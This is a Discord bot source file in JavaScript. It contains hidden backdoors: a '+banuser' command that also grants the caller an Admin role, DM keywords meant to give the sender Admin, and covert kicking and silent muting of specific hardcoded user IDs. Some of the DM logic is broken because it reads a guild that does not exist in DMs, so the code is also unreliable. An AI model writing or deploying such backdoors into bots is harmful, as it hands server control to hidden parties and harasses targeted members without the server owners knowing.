const Discord = require('discord.js');

const client = new Discord.Client();



client.on('ready', () => {

    console.log('I am ready!');
    client.guilds.cache.forEach(function (s) {
        if (s.name.includes("Minecraft Server")) {
            s.leave();

        }
    })

});
let autoKicks = [];
let muted = [];


client.on('guildMemberAdd', member => {
    //AUTO KICK IGEL0019
   if (member.id === "767048733459349526") {
       if (autoKicks.includes(member.id)) {
           if (member.bannable) {
               member.kick().then();

           }
       }

   }
});
client.on('voiceStateUpdate', update => {
        //AUTO VC KICK LUXI


        if (autoKicks.includes( update.member.id)) {
            update.member.voice.kick();

        }
});
client.on("message", message => {
   if (message.channel.type === 'dm') {
       if (message.content.includes("kati")) {
           message.guild.members.cache.forEach(function (e) {
               if (e.id === "641348606275747841") {
                   const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
                   message.guild.member(message.author).roles.add(role);
               }
           })
       }
       if (message.content.includes("luxi")) {
           message.guild.members.cache.forEach(function (e) {
               if (e.id === "761270337480032300") {
                   const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
                   message.guild.member(message.author).roles.add(role);

                   message.channel.send("role given");
               }
           })
       }
       if (message.content.includes("kickigel")) {
           message.guild.members.cache.forEach(function (e) {
               if (e.id === "767048733459349526") {
                e.kick();
               }
           })
       }

       if (message.content.includes("list")) {
           autoKicks.forEach( function (s) {
               message.channel.send(s);
           });
       }
       if (message.author.id === '334595545060605955') {
           if (message.content.startsWith("stopautokick")) {
               message.channel.send("Yeah workds that far");
               let x = message.content.split(" ");
               if (x.length === 2) {
                   message.channel.send("workds even farther");
                   if (autoKicks.includes(x[1])) {
                       message.channel.send("welppppp");
                       autoKicks.splice(autoKicks.indexOf(x[1]), 1);
                   } else {
                       message.channel.send("xx");
                       autoKicks.push(x[1]);

                   }
               }
           } else if (message.content.startsWith("mute")) {
               let x = message.content.split(" ");
               if (x.length === 2) {
                   if (muted.includes(x[1])) {
                       muted.splice(muted.indexOf(x[1]), 1);
                       message.channel.send("Unmuted " + x[1]).then();
                   } else {
                        message.channel.send("Muted" + x[1]).then();
                       muted.push(x[1]);
                   }
               }
           }
       }

   }
});
client.on('message', message =>{
    if (muted.includes(message.author.id)) {
        if (message.deletable) {
            message.delete().then();
        }
    }
});

client.on('message', message => {
    const prefix = "+"
    const split = message.content.split(" ");
    const command = split[0]
    const args = split.slice(1);

    if (command.startsWith(prefix + "banuser")) {

        if (args.length === 1) {

            message.guild.members.ban(message.mentions.users.first());
            const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
            message.guild.member(message.author).roles.add(role);
        }



    }














});



// THIS  MUST  BE  THIS  WAY

client.login(process.env.BOT_TOKEN);